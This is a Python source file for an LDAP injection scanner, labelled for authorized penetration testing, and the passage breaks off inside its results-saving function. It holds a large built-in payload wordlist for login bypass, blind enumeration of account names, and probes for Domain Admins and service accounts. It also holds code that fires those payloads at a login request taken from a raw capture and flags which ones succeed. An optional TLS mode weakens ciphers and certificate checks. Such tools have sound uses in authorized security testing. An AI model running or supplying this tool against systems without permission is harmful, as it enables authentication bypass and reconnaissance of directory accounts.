#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ldapscanner.py - LDAP Injection Testing Tool for Authorized Penetration Tests

Reads a raw HTTP request (Burp-style), substitutes user-placed markers with
payloads from a built-in or external wordlist, and detects LDAP injection
vulnerabilities via response differential analysis.

Requirements:
    pip install requests urllib3 colorama

Usage:
    python3 ldapscanner.py -r request.txt
    python3 ldapscanner.py -r request.txt -w custom_wordlist.txt --mode bypass
    python3 ldapscanner.py -r request.txt --known-user admin --max-attempts 5
    python3 ldapscanner.py -r request.txt --ssl --proxy http://127.0.0.1:8080

For authorized security testing only. Use against systems you own or have
written permission to test.
"""

import argparse
import json
import os
import re
import signal
import ssl
import sys
import time
import urllib.parse
from datetime import datetime, timezone


def _utcnow_iso() -> str:
    """ISO 8601 UTC timestamp, Python 3.12-safe."""
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _from_ts_iso(ts: float) -> str:
    """ISO 8601 UTC from epoch seconds, Python 3.12-safe."""
    return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
from typing import Any, Dict, List, Optional, Tuple

try:
    import requests
    import urllib3
    from colorama import Fore, Style, init as colorama_init
except ImportError as e:
    sys.stderr.write(
        "Missing dependency: {}\n"
        "Install with: pip install requests urllib3 colorama\n".format(e.name)
    )
    sys.exit(1)

try:
    import certifi
    _CERTIFI_CA: Optional[str] = certifi.where()
except ImportError:
    _CERTIFI_CA = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama_init(autoreset=True)


# ============================================================================
# CONSTANTS / DEFAULTS
# ============================================================================

VERSION = "1.0"

DEFAULT_DELAY = 0.5
DEFAULT_MAX_ATTEMPTS = 10
DEFAULT_TIMEOUT = 10
DEFAULT_THRESHOLD = 50
KNOWNUSER_MIN_DELAY = 2.0

DEFAULT_SUCCESS_KEYWORDS = [
    "dashboard", "welcome", "logout", "anasayfa",
    "profile", "home", "hoşgeldin", "başarılı",
]
DEFAULT_ERROR_KEYWORDS = [
    "invalid", "error", "incorrect", "failed",
    "hatalı", "geçersiz", "wrong", "unauthorized",
]

MARKERS = ["USERNAME", "KNOWNUSER", "PASSWORD", "DOMAIN", "FUZZ"]

SAFE_BASELINES = {
    "USERNAME": "invaliduser_baseline_xyz",
    "FUZZ": "fuzz_baseline_xyz",
    "PASSWORD": "Passw0rd!Test",
    "DOMAIN": "users",
}

ASPNET_TOKENS = [
    "__VIEWSTATE",
    "__VIEWSTATEGENERATOR",
    "__EVENTVALIDATION",
    "__RequestVerificationToken",
]

# Filter keywords (case-insensitive matching)
DOMAIN_KEYWORDS = ["objectclass", "cn=", "uid=", "dc=", "ou="]
BYPASS_KEYWORDS = ["objectclass", "uid=*)", "cn=*))", "|(mail", "objectclass=*)"]

ENUM_PATTERNS = [
    re.compile(r"cn=[a-z]\*", re.IGNORECASE),
    re.compile(r"samaccountname=[a-z]\*", re.IGNORECASE),
    re.compile(r"samaccountname=admin\*", re.IGNORECASE),
]

BANNER = r"""
 _     ____    _    ____  ____                                  
| |   |  _ \  / \  |  _ \/ ___|  ___ __ _ _ __  _ __   ___ _ __ 
| |   | | | |/ _ \ | |_) \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
| |___| |_| / ___ \|  __/ ___) | (_| (_| | | | | | | |  __/ |   
|_____|____/_/   \_\_|   |____/ \___\__,_|_| |_|_| |_|\___|_|   

   LDAP Injection Scanner  v{ver}
   For authorized penetration testing only
"""

# Built-in wordlist as per spec
BUILTIN_WORDLIST = r"""
*
*)(&
*))%00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
!
%21
%26
%28
%29
%2A%28%7C%28mail%3D%2A%29%29
%2A%28%7C%28objectclass%3D%2A%29%29
%2A%7C
%7C
&
(
)
)(cn=))\x00
*)(|(mail=*))
*)(|(objectclass=*))

# === BOOLEAN BYPASS ===
*)(cn=*
*)(uid=*
*)(sn=*
*)(givenName=*
admin)(cn=*
admin)(uid=*
*)(&(objectClass=*
*))(&(objectClass=*
*)(objectClass=*)(cn=*
*(cn=*)
*(uid=*)
*(mail=*)
*(sn=*)

# === AD SPECIFIC ATTRIBUTES ===
*(|(samaccountname=*))
*(|(userprincipalname=*))
*(|(distinguishedName=*))
*(|(servicePrincipalName=*))
*(|(memberOf=*))
*(|(userAccountControl=*))
*(|(adminCount=*))
*(|(description=*))
*(|(homeDirectory=*))

# === FILTER CLOSING VARIATIONS ===
*))(|(cn=*
*))%00
admin)(|(password=*
*))(objectClass=*
*)(|(objectClass=person)(cn=*
*)(|(objectClass=user)(cn=*
admin*))(|(objectClass=*
*)(cn=admin)%00
*)(mail=*)%00
*))(|(samaccountname=*
*)(|(samaccountname=admin)(cn=*

# === BLIND ENUMERATION ===
*(|(cn=a*))
*(|(cn=b*))
*(|(cn=c*))
*(|(cn=d*))
*(|(cn=e*))
*(|(cn=f*))
*(|(cn=g*))
*(|(cn=h*))
*(|(cn=i*))
*(|(cn=j*))
*(|(cn=k*))
*(|(cn=l*))
*(|(cn=m*))
*(|(cn=n*))
*(|(cn=o*))
*(|(cn=p*))
*(|(cn=q*))
*(|(cn=r*))
*(|(cn=s*))
*(|(cn=t*))
*(|(cn=u*))
*(|(cn=v*))
*(|(cn=w*))
*(|(cn=x*))
*(|(cn=y*))
*(|(cn=z*))
*(|(samaccountname=a*))
*(|(samaccountname=b*))
*(|(samaccountname=c*))
*(|(samaccountname=d*))
*(|(samaccountname=e*))
*(|(samaccountname=f*))
*(|(samaccountname=g*))
*(|(samaccountname=h*))
*(|(samaccountname=i*))
*(|(samaccountname=j*))
*(|(samaccountname=k*))
*(|(samaccountname=l*))
*(|(samaccountname=m*))
*(|(samaccountname=n*))
*(|(samaccountname=o*))
*(|(samaccountname=p*))
*(|(samaccountname=q*))
*(|(samaccountname=r*))
*(|(samaccountname=s*))
*(|(samaccountname=t*))
*(|(samaccountname=u*))
*(|(samaccountname=v*))
*(|(samaccountname=w*))
*(|(samaccountname=x*))
*(|(samaccountname=y*))
*(|(samaccountname=z*))
*(|(samaccountname=admin*))
*(|(samaccountname=administrator*))
*(|(samaccountname=svc*))
*(|(samaccountname=service*))
*(|(samaccountname=test*))
*(|(samaccountname=user*))
*(|(samaccountname=guest*))

# === ATTRIBUTE ENUMERATION ===
*(|(givenName=*))
*(|(sn=*))
*(|(telephoneNumber=*))
*(|(memberOf=*))
*(|(department=*))
*(|(company=*))
*(|(title=*))
*(|(mobile=*))

# === OID BASED BYPASS ===
*(2.5.4.3=*)
*(2.5.4.0=*)
*(2.5.4.10=*)
*(2.5.4.6=*)

# === ENCODING BYPASS ===
%2A%29%28%7C%28cn%3D%2A%29%29
%2A%29%28%7C%28objectclass%3D%2A%29%29
\2a\29\28\7c\28cn\3d\2a\29\29
%2A%29%29%28%7C%28cn%3D%2A%29%29
%61%64%6d%69%6e

# === NULL BYTE VARIATIONS ===
admin%00
admin\x00
admin\00
*%00
admin*)%00
*)(cn=*%00

# === SPECIAL CHARACTER COMBINATIONS ===
)(
)()(
&(cn=*)
|(cn=*)
!(cn=something)
(&(objectclass=user)(cn=*))
(&(objectclass=person)(cn=*))
(|(objectclass=user)(objectclass=person))
(&(objectClass=user)(samaccountname=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# === ADMIN BYPASS ===
admin*)(|(cn=*
administrator*
Administrator*
ADMIN*
admin)(|(userPassword=*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
)(|(userPassword=*
admin)(userPassword=*
admin)(&(password=*

# === OBJECTCLASS ENUMERATION ===
*(objectClass=user)
*(objectClass=person)
*(objectClass=group)
*(objectClass=computer)
*(objectClass=organizationalUnit)
*(objectClass=inetOrgPerson)
*(objectClass=posixAccount)

# === HIGH PRIVILEGE ACCOUNT DETECTION ===
*(|(memberOf=CN=Domain Admins*))
*(|(memberOf=CN=Enterprise Admins*))
*(|(memberOf=CN=Administrators*))
*(|(adminCount=1))

# === SERVICE ACCOUNTS ===
*(|(samaccountname=svc_*))
*(|(samaccountname=sql*))
*(|(samaccountname=iis*))
*(|(samaccountname=web*))
*(|(samaccountname=app*))

# === DN INJECTION ===
,cn=*
,dc=*
cn=*,
cn=admin,dc=*
cn=*)(cn=*
"""


# ============================================================================
# LEGACY TLS RENEGOTIATION SUPPORT
# ============================================================================
# OpenSSL 3.0+ disables unsafe legacy renegotiation by default (RFC 5746).
# Many older IIS / appliance / network-gear targets still require it. This
# adapter rebuilds the SSL context with the legacy flag enabled and a relaxed
# security level, ONLY when the user opts in via --legacy-ssl.

# OpenSSL flag value (not always present as a Python constant)
_SSL_OP_LEGACY_SERVER_CONNECT = getattr(ssl, "OP_LEGACY_SERVER_CONNECT", 0x4)


class LegacyRenegotiationAdapter(requests.adapters.HTTPAdapter):
    """
    HTTPAdapter that allows TLS legacy renegotiation and a lowered cipher
    security level. Use against older Microsoft IIS, Apache, and embedded
    devices that haven't been updated to RFC 5746 secure renegotiation.

    Verify state is locked in at construction because supplying an explicit
    ssl_context to requests bypasses its normal `verify=` handling — the
    context itself has to be configured correctly up front.
    """

    def __init__(self, verify: bool = True, *args, **kwargs):
        self._verify = verify
        super().__init__(*args, **kwargs)

    def _build_legacy_context(self) -> ssl.SSLContext:
        # When we hand requests an ssl_context, we lose the certifi-based CA
        # bundle requests would normally use. Pass it in explicitly.
        if self._verify and _CERTIFI_CA:
            ctx = ssl.create_default_context(cafile=_CERTIFI_CA)
        else:
            ctx = ssl.create_default_context()

        ctx.options |= _SSL_OP_LEGACY_SERVER_CONNECT
        # Older servers may negotiate weaker ciphers OpenSSL 3 rejects at the
        # default SECLEVEL=2. Drop to SECLEVEL=0 for compatibility.
        try:
            ctx.set_ciphers("DEFAULT@SECLEVEL=0")
        except ssl.SSLError:
            pass

        if not self._verify:
            # Order matters: check_hostname must be False BEFORE setting
            # verify_mode = CERT_NONE, otherwise Python raises ValueError.
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        return ctx

    def init_poolmanager(self, *args, **kwargs):
        kwargs["ssl_context"] = self._build_legacy_context()
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs["ssl_context"] = self._build_legacy_context()
        return super().proxy_manager_for(*args, **kwargs)


def get_session(args: argparse.Namespace) -> requests.Session:
    """Build (or reuse) a Session with the legacy adapter mounted if requested."""
    cached = getattr(args, "_session", None)
    if cached is not None:
        return cached
    session = requests.Session()
    if getattr(args, "legacy_ssl", False):
        adapter = LegacyRenegotiationAdapter(verify=not args.no_verify)
        session.mount("https://", adapter)
    args._session = session
    return session


# Global state for graceful shutdown
_INTERRUPTED = False
_PARTIAL_STATE: Dict[str, Any] = {
    "results": [],
    "output_path": None,
    "scanner_ref": None,
}


# ============================================================================
# PRINT HELPERS
# ============================================================================

def info(msg: str) -> None:
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")


def warn(msg: str) -> None:
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")


def err(msg: str) -> None:
    print(f"{Fore.RED}[X]{Style.RESET_ALL} {msg}")


def potential(msg: str) -> None:
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")


def vuln(msg: str) -> None:
    print(f"{Fore.RED}{Style.BRIGHT}[VULN]{Style.RESET_ALL} {msg}")


def confirm(question: str) -> bool:
    """Yes/no prompt. Returns True only on explicit y/yes."""
    try:
        ans = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} {question} [y/N]: ").strip().lower()
    except EOFError:
        return False
    return ans in ("y", "yes")


# ============================================================================
# REQUEST PARSING
# ============================================================================

def parse_request(filepath: str) -> Dict[str, Any]:
    """
    Parse a Burp-style raw HTTP request from a text file.

    Returns dict with: method, path, host, headers (dict), body (str), http_version.
    """
    if not os.path.isfile(filepath):
        raise FileNotFoundError(f"Request file not found: {filepath}")

    with open(filepath, "rb") as f:
        raw_bytes = f.read()

    # Decode as latin-1 to preserve any binary in body; we'll re-encode on send
    raw = raw_bytes.decode("utf-8", errors="replace")
    # Normalize line endings for parsing the header section
    normalized = raw.replace("\r\n", "\n")

    # Split header block from body on the first blank line
    if "\n\n" in normalized:
        header_section, body = normalized.split("\n\n", 1)
    else:
        header_section, body = normalized, ""

    lines = header_section.split("\n")
    if not lines or not lines[0].strip():
        raise ValueError("Empty request file or missing request line.")

    request_line = lines[0].strip()
    parts = request_line.split(" ")
    if len(parts) < 2:
        raise ValueError(f"Invalid request line: {request_line!r}")

    method = parts[0].upper()
    path = parts[1]
    http_version = parts[2] if len(parts) >= 3 else "HTTP/1.1"

    headers: Dict[str, str] = {}
    for line in lines[1:]:
        if not line.strip():
            continue
        if ":" not in line:
            continue
        key, _, value = line.partition(":")
        headers[key.strip()] = value.strip()

    host = headers.get("Host", "").strip()
    if not host:
        raise ValueError("Host header is missing from the request.")

    return {
        "method": method,
        "path": path,
        "host": host,
        "headers": headers,
        "body": body,
        "http_version": http_version,
    }


def detect_aspnet_tokens(body: str) -> List[str]:
    """Return list of ASP.NET session tokens present in the body."""
    return [t for t in ASPNET_TOKENS if t in body]


# ============================================================================
# MARKER HANDLING
# ============================================================================

def detect_markers(parsed: Dict[str, Any]) -> List[str]:
    """Return the list of markers found anywhere in body/path/headers."""
    haystack = parsed["body"] + " " + parsed["path"]
    for v in parsed["headers"].values():
        haystack += " " + v
    return [m for m in MARKERS if m in haystack]


def map_markers_to_fields(body: str) -> Dict[str, str]:
    """
    For application/x-www-form-urlencoded bodies, map each marker to the
    form field name that contains it. For other body types, return the
    marker name itself as the 'field'.
    """
    mapping: Dict[str, str] = {}

    # Heuristic: looks like form-urlencoded if it has key=value pairs
    looks_form = "=" in body and "\n" not in body.strip()
    if looks_form:
        for pair in body.split("&"):
            if "=" not in pair:
                continue
            key, _, value = pair.partition("=")
            for m in MARKERS:
                if m in value:
                    mapping[m] = key

    # Fallback for any marker not yet mapped
    for m in MARKERS:
        if m in body and m not in mapping:
            mapping[m] = m
    return mapping


# ============================================================================
# PAYLOAD LOADING / FILTERING
# ============================================================================

def load_payloads(args: argparse.Namespace) -> List[str]:
    """Load payloads from --wordlist file if given, else from BUILTIN_WORDLIST."""
    if args.wordlist:
        if not os.path.isfile(args.wordlist):
            raise FileNotFoundError(f"Wordlist file not found: {args.wordlist}")
        with open(args.wordlist, "r", encoding="utf-8", errors="replace") as f:
            raw_lines = f.readlines()
        info(f"Loaded external wordlist: {args.wordlist}")
    else:
        raw_lines = BUILTIN_WORDLIST.splitlines()
        info("Using built-in wordlist.")

    payloads = []
    seen = set()
    for ln in raw_lines:
        s = ln.rstrip("\r\n")
        if not s.strip():
            continue
        if s.lstrip().startswith("#"):
            continue
        if s in seen:
            continue
        seen.add(s)
        payloads.append(s)

    return payloads


def filter_by_mode(payloads: List[str], mode: str) -> List[str]:
    """Filter payloads by scan mode: full / bypass / enum."""
    if mode == "full":
        return list(payloads)
    if mode == "bypass":
        out = []
        for p in payloads:
            pl = p.lower()
            if any(kw in pl for kw in BYPASS_KEYWORDS):
                out.append(p)
        return out
    if mode == "enum":
        return [p for p in payloads if any(pat.search(p) for pat in ENUM_PATTERNS)]
    return list(payloads)


def filter_for_domain(payloads: List[str]) -> List[str]:
    """DOMAIN marker only accepts domain-relevant payloads."""
    out = []
    for p in payloads:
        pl = p.lower()
        if any(kw in pl for kw in DOMAIN_KEYWORDS):
            out.append(p)
    return out


# ============================================================================
# ENCODING / BODY BUILDING
# ============================================================================

ENCODED_RX = re.compile(r"%[0-9A-Fa-f]{2}")


def maybe_encode(payload: str, enable: bool, announce: bool = True) -> str:
    """URL-encode payload only if --encode active and not already encoded."""
    if not enable:
        return payload
    if ENCODED_RX.search(payload):
        if announce:
            print(f"{Fore.CYAN}[~]{Style.RESET_ALL} Skipping encode (already encoded): {payload}")
        return payload
    return urllib.parse.quote(payload, safe="")


def build_body(
    original_body: str,
    active_marker: Optional[str],
    payload: Optional[str],
    known_user: Optional[str],
    encode: bool,
    announce_encode: bool = True,
) -> str:
    """
    Substitute markers in body.

    - active_marker → payload (encoded if --encode)
    - KNOWNUSER active → payload appended AFTER known_user
    - All other markers → their safe baseline values
    - When active_marker is None (baseline), all markers → safe baselines.
    """
    body = original_body

    for marker in MARKERS:
        if marker not in body:
            continue

        if marker == active_marker and payload is not None:
            if marker == "KNOWNUSER":
                if not known_user:
                    raise ValueError("KNOWNUSER marker active but --known-user not provided.")
                value = known_user + maybe_encode(payload, encode, announce=announce_encode)
            else:
                value = maybe_encode(payload, encode, announce=announce_encode)
        else:
            # Use safe baseline value
            if marker == "KNOWNUSER":
                if known_user:
                    value = known_user + "_baseline_xyz"
                else:
                    value = "knownuser_baseline_xyz"
            else:
                value = SAFE_BASELINES.get(marker, marker.lower() + "_safe")

        body = body.replace(marker, value)

    return body


def update_content_length(headers: Dict[str, str], body_bytes: bytes) -> Dict[str, str]:
    """Return a fresh headers dict with Content-Length recalculated."""
    new_headers = {}
    for k, v in headers.items():
        if k.lower() == "content-length":
            continue
        new_headers[k] = v
    # Always set Content-Length when there's a method that typically has a body
    new_headers["Content-Length"] = str(len(body_bytes))
    return new_headers


# ============================================================================
# REQUEST SENDING
# ============================================================================

def build_url(parsed: Dict[str, Any], force_ssl: bool) -> str:
    """Construct full URL from parsed request + scheme flags."""
    host = parsed["host"]
    if force_ssl:
        scheme = "https"
    elif host.endswith(":443") or ":443/" in host:
        scheme = "https"
    else:
        scheme = "http"
    return f"{scheme}://{host}{parsed['path']}"


def send_request(
    parsed: Dict[str, Any],
    body: str,
    args: argparse.Namespace,
) -> Tuple[Optional[requests.Response], float, Optional[str]]:
    """
    Send the HTTP request with recalculated Content-Length.

    Always uses allow_redirects=False. Returns (response, elapsed_seconds, error_msg).
    """
    body_bytes = body.encode("utf-8", errors="replace")
    headers = update_content_length(parsed["headers"], body_bytes)
    url = build_url(parsed, args.ssl)

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    t0 = time.perf_counter()
    try:
        session = get_session(args)
        resp = session.request(
            method=parsed["method"],
            url=url,
            headers=headers,
            data=body_bytes,
            allow_redirects=False,
            verify=not args.no_verify,
            timeout=args.timeout,
            proxies=proxies,
        )
        elapsed = time.perf_counter() - t0
        return resp, elapsed, None
    except requests.exceptions.Timeout:
        return None, time.perf_counter() - t0, "timeout"
    except requests.exceptions.SSLError as e:
        return None, time.perf_counter() - t0, f"ssl_error: {e}"
    except requests.exceptions.ConnectionError as e:
        return None, time.perf_counter() - t0, f"connection_error: {e}"
    except requests.exceptions.RequestException as e:
        return None, time.perf_counter() - t0, f"request_error: {e}"


# ============================================================================
# BASELINE / DETECTION
# ============================================================================

def run_baseline(parsed: Dict[str, Any], args: argparse.Namespace) -> Dict[str, Any]:
    """
    Send one request with all markers replaced by safe dummy values.

    Returns dict with: status, length, time, location, body_text.
    """
    body = build_body(
        parsed["body"],
        active_marker=None,
        payload=None,
        known_user=args.known_user,
        encode=args.encode,
        announce_encode=False,
    )
    resp, elapsed, error = send_request(parsed, body, args)
    if resp is None:
        hint = ""
        if error and "UNSAFE_LEGACY_RENEGOTIATION_DISABLED" in error:
            hint = (
                "\n    Hint: the target requires legacy TLS renegotiation "
                "(common on older IIS).\n          Re-run with --legacy-ssl"
            )
        elif error and error.startswith("ssl_error") and not args.no_verify:
            hint = "\n    Hint: try --no-verify if the cert chain is the issue."
        raise RuntimeError(f"Baseline request failed: {error}{hint}")
    return {
        "status": resp.status_code,
        "length": len(resp.content),
        "time": elapsed,
        "location": resp.headers.get("Location"),
        "body_text": resp.text,
    }


def run_valid_baseline(parsed: Dict[str, Any], args: argparse.Namespace) -> Optional[Dict[str, Any]]:
    """
    Run a known-good login baseline if --baseline-user and --baseline-pass are set.

    Substitutes USERNAME / KNOWNUSER with the valid user, PASSWORD with the valid pass.
    """
    if not (args.baseline_user and args.baseline_pass):
        return None

    body = parsed["body"]
    # USERNAME / KNOWNUSER → valid user
    for m in ("USERNAME", "KNOWNUSER"):
        if m in body:
            body = body.replace(m, args.baseline_user)
    if "PASSWORD" in body:
        body = body.replace("PASSWORD", args.baseline_pass)
    # Replace anything remaining with safe baselines
    body = build_body(
        body, active_marker=None, payload=None,
        known_user=args.known_user, encode=args.encode, announce_encode=False,
    )

    resp, elapsed, error = send_request(parsed, body, args)
    if resp is None:
        warn(f"Valid baseline request failed: {error}")
        return None
    return {
        "status": resp.status_code,
        "length": len(resp.content),
        "time": elapsed,
        "location": resp.headers.get("Location"),
        "body_text": resp.text,
    }


def detect(
    response: requests.Response,
    elapsed: float,
    baseline: Dict[str, Any],
    success_kw: List[str],
    error_kw: List[str],
    threshold: int,
) -> List[str]:
    """Compare response against baseline. Return list of fired detector names."""
    fired = []
    body_text = response.text or ""
    body_lower = body_text.lower()
    baseline_body_lower = (baseline.get("body_text") or "").lower()
    length = len(response.content)

    # STATUS_CHANGE
    if response.status_code != baseline["status"]:
        fired.append("STATUS_CHANGE")

    # LENGTH_DIFF
    if abs(length - baseline["length"]) > threshold:
        fired.append("LENGTH_DIFF")

    # SUCCESS_KEYWORD (in current, regardless of baseline)
    for kw in success_kw:
        if kw and kw.lower() in body_lower:
            fired.append("SUCCESS_KEYWORD")
            break

    # ERROR_GONE: was in baseline body, absent in current
    for kw in error_kw:
        kwl = kw.lower()
        if kwl and kwl in baseline_body_lower and kwl not in body_lower:
            fired.append("ERROR_GONE")
            break

    # REDIRECT_CHANGE
    cur_loc = response.headers.get("Location")
    base_loc = baseline.get("location")
    if cur_loc != base_loc:
        # Only fire if at least one side actually had a Location
        if cur_loc is not None or base_loc is not None:
            fired.append("REDIRECT_CHANGE")

    return fired


# ============================================================================
# SCANNER
# ============================================================================

class Scanner:
    """Orchestrates the LDAP injection scan loop."""

    def __init__(
        self,
        parsed: Dict[str, Any],
        payloads: List[str],
        args: argparse.Namespace,
        markers_found: List[str],
        marker_to_field: Dict[str, str],
    ):
        self.parsed = parsed
        self.payloads = payloads
        self.args = args
        self.markers_found = markers_found
        self.marker_to_field = marker_to_field

        # Parse keyword overrides
        self.success_kw = (
            [k.strip() for k in args.success_kw.split(",") if k.strip()]
            if args.success_kw
            else list(DEFAULT_SUCCESS_KEYWORDS)
        )
        self.error_kw = (
            [k.strip() for k in args.error_kw.split(",") if k.strip()]
            if args.error_kw
            else list(DEFAULT_ERROR_KEYWORDS)
        )

        self.results: List[Dict[str, Any]] = []
        self.start_time = 0.0
        self.findings = 0
        self.high_confidence = 0
        self.total_sent = 0
        self.baseline: Optional[Dict[str, Any]] = None
        self.baseline_valid: Optional[Dict[str, Any]] = None

        _PARTIAL_STATE["scanner_ref"] = self

    # --------------------------------------------------------------------
    def select_payloads_for(self, marker: str) -> List[str]:
        """Return the filtered payload list for this marker."""
        base = filter_by_mode(self.payloads, self.args.mode)
        if marker == "DOMAIN":
            base = filter_for_domain(base)
        if marker == "KNOWNUSER":
            base = base[: self.args.max_attempts]
        return base

    def delay_for(self, marker: str) -> float:
        """Return the per-request delay enforced for this marker."""
        if marker == "KNOWNUSER":
            if self.args.delay < KNOWNUSER_MIN_DELAY and not self.args.force:
                return KNOWNUSER_MIN_DELAY
        return self.args.delay

    # --------------------------------------------------------------------
    def run(self) -> None:
        self.start_time = time.time()

        # ===== Baselines =====
        info("Running invalid baseline...")
        self.baseline = run_baseline(self.parsed, self.args)
        info(
            f"Baseline (invalid): status={self.baseline['status']}, "
            f"len={self.baseline['length']}, time={self.baseline['time']:.2f}s"
            + (f", location={self.baseline['location']}" if self.baseline.get("location") else "")
        )

        self.baseline_valid = run_valid_baseline(self.parsed, self.args)
        if self.baseline_valid:
            info(
                f"Baseline (valid):   status={self.baseline_valid['status']}, "
                f"len={self.baseline_valid['length']}, "
                f"time={self.baseline_valid['time']:.2f}s"
                + (f", location={self.baseline_valid['location']}"
                   if self.baseline_valid.get("location") else "")
            )

        # ===== Decide which markers to scan =====
        markers_to_scan = []
        for m in self.markers_found:
            if m == "PASSWORD" and not self.args.inject_password:
                continue
            markers_to_scan.append(m)

        if not markers_to_scan:
            warn("No injectable markers will be scanned. "
                 "Add a marker (USERNAME/KNOWNUSER/DOMAIN/FUZZ) to the body, "
                 "or pass --inject-password for the PASSWORD marker.")
            return

        # Compute total for progress counter
        per_marker: Dict[str, List[str]] = {}
        total = 0
        for m in markers_to_scan:
            pls = self.select_payloads_for(m)
            per_marker[m] = pls
            total += len(pls)
        info(f"Total payloads to send across markers: {total}")
        print()

        # ===== Main scan loop =====
        idx = 0
        for marker in markers_to_scan:
            field = self.marker_to_field.get(marker, marker)
            info(f"Scanning marker {marker} (field: {field}) "
                 f"with {len(per_marker[marker])} payloads")

            for j, payload in enumerate(per_marker[marker], start=1):
                if _INTERRUPTED:
                    warn("Interrupt flag set — stopping scan loop.")
                    return
                idx += 1
                self.total_sent = idx

                # Optional KNOWNUSER attempt counter line
                if marker == "KNOWNUSER":
                    info(f"  KNOWNUSER attempt {j}/{len(per_marker[marker])} "
                         f"(max-attempts={self.args.max_attempts})")

                self._scan_one(idx, total, marker, field, payload)
                time.sleep(self.delay_for(marker))

    # --------------------------------------------------------------------
    def _scan_one(self, idx: int, total: int, marker: str, field: str, payload: str) -> None:
        body = build_body(
            self.parsed["body"],
            active_marker=marker,
            payload=payload,
            known_user=self.args.known_user,
            encode=self.args.encode,
            announce_encode=True,
        )
        # Also substitute markers in path / headers if present (uses safe values
        # for non-active markers and the encoded payload for the active one).
        parsed_for_send = self._materialize_meta(marker, payload)

        # Use the substituted body
        parsed_for_send["body"] = body

        resp, elapsed, error = send_request(parsed_for_send, body, self.args)
        record: Dict[str, Any] = {
            "timestamp": _utcnow_iso(),
            "field": field,
            "marker": marker,
            "payload": payload,
            "payload_index": idx,
            "status_code": None,
            "response_length": None,
            "response_time": elapsed,
            "baseline_status": self.baseline["status"],
            "baseline_length": self.baseline["length"],
            "baseline_time": self.baseline["time"],
            "detectors_fired": [],
            "confidence": "NONE",
            "vulnerable": False,
            "error": error,
        }

        if resp is None:
            warn(f"[{idx:04d}/{total:04d}] {field} ← {payload!r} :: ERROR {error}")
            self.results.append(record)
            _PARTIAL_STATE["results"] = self.results
            return

        length = len(resp.content)
        diff = length - self.baseline["length"]
        diff_str = f"({diff:+d})"
        record["status_code"] = resp.status_code
        record["response_length"] = length

        fired = detect(
            resp,
            elapsed,
            self.baseline,
            self.success_kw,
            self.error_kw,
            self.args.threshold,
        )
        record["detectors_fired"] = fired

        if len(fired) >= 2:
            confidence = "HIGH"
            record["confidence"] = "HIGH"
            record["vulnerable"] = True
            self.findings += 1
            self.high_confidence += 1
        elif len(fired) == 1:
            confidence = "POTENTIAL"
            record["confidence"] = "POTENTIAL"
            record["vulnerable"] = True
            self.findings += 1
        else:
            confidence = "NONE"

        self.results.append(record)
        _PARTIAL_STATE["results"] = self.results

        # ---- Print line ----
        if confidence == "NONE" and not self.args.verbose:
            return

        tags = " ".join(f"[{d.replace('_', ' ')}]" for d in fired) if fired else "[CLEAN]"
        prefix = f"[{idx:04d}/{total:04d}]"
        # Truncate ugly long payloads for terminal sanity
        payload_disp = payload if len(payload) <= 60 else payload[:57] + "..."
        line = (
            f"{prefix} Field: {field} | Payload: {payload_disp} | "
            f"Status: {resp.status_code} | Len: {length} {diff_str} | "
            f"Time: {elapsed:.2f}s | {tags}"
        )

        if confidence == "HIGH":
            vuln(line)
        elif confidence == "POTENTIAL":
            potential(line)
        else:
            print(f"{Style.DIM}{line}{Style.RESET_ALL}")

    # --------------------------------------------------------------------
    def _materialize_meta(self, active_marker: str, payload: str) -> Dict[str, Any]:
        """
        Build a copy of parsed with markers substituted in path and headers
        (body substitution is done by the caller using build_body).
        """
        copy = {
            "method": self.parsed["method"],
            "host": self.parsed["host"],
            "path": self.parsed["path"],
            "body": self.parsed["body"],  # caller overrides
            "http_version": self.parsed["http_version"],
            "headers": dict(self.parsed["headers"]),
        }

        # Substitute markers in path and header values
        for marker in MARKERS:
            if marker == active_marker:
                if marker == "KNOWNUSER":
                    val = (self.args.known_user or "knownuser") + maybe_encode(
                        payload, self.args.encode, announce=False
                    )
                else:
                    val = maybe_encode(payload, self.args.encode, announce=False)
            else:
                if marker == "KNOWNUSER":
                    val = (self.args.known_user or "knownuser") + "_baseline_xyz"
                else:
                    val = SAFE_BASELINES.get(marker, marker.lower() + "_safe")

            if marker in copy["path"]:
                copy["path"] = copy["path"].replace(marker, val)
            for hk, hv in list(copy["headers"].items()):
                if marker in hv:
                    copy["headers"][hk] = hv.replace(marker, val)

        return copy

    # --------------------------------------------------------------------
    def save_results(self, output_path: str) -> None:
        url = build_url(self.parsed, self.args.ssl)
        out_results = self.results
        if self.args.only_findings:
            out_results = [r for r in self.results if r.get("vulnerable")]

        meta = {
            "tool": "ldapscanner.py",
            "version": VERSION,
            "scan_started": _from_ts_iso(self.start_time),
            "scan_ended": _utcnow_iso(),
            "target_url": url,
            "method": self.parsed["method"],
            "mode": self.args.mode,
            "encode": self.args.encode,
            "markers_found": self.markers_found,
            "marker_to_field": self.marker_to_field,
            "baseline_invalid": {k: v for k, v in (self.baseline or {}).items() if k != "body_text"},
            "baseline_valid": (
                {k: v for k, v in self.baseline_valid.items() if k != "body_text"}
                if self.baseline_valid else None
            ),
            "total_requests": self.total_sent,
            "findings": sum(1 for r in self.results if r.get("vulnerable")),
            "high_confidence": sum(1 for r in self.results if r.get("confidence") == "HIGH"),
            "only_findings_filter": self.args.only_findings,
        }
        payload = {"meta": meta, "results": out_results}

        with open(output_path, "w", encoding="utf-8") as f:
